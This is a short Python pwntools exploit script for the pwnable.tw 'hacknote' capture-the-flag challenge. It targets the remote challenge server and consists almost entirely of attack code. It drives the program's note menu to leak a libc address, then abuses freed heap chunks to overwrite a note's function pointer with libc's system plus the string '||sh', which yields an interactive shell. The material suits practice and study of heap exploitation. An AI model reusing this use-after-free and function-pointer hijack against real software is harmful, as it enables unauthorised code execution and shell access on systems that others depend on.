#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level="debug"
pwn_file="./hacknote"
elf=ELF(pwn_file)
libc=ELF("./libc_32.so.6")

if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("chall.pwnable.tw", 10102)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()


def add(size, data):
    r.sendafter("choice :", "1")
    r.sendafter("size :", str(size))
    r.sendafter("Content :", data)

def dele(index):
    r.sendafter("choice :", "2")
    r.sendafter("Index :", str(index))

def show(index):
    r.sendafter("choice :", "3")
    r.sendafter("Index :", str(index))

debug()

add(0x200, 'a')
add(0x18, 'a')
dele(0)
add(0x8, 'a')
show(2)

r.recv(4)
a = u32(r.recv(4)) - 0x1b09a8
libc.address = a
success("libc:  " + hex(a))

dele(2)
dele(2)
dele(1)

add(0x8, p32(libc.sym['system'])+"||sh\x00")
show(0)

r.interactive()
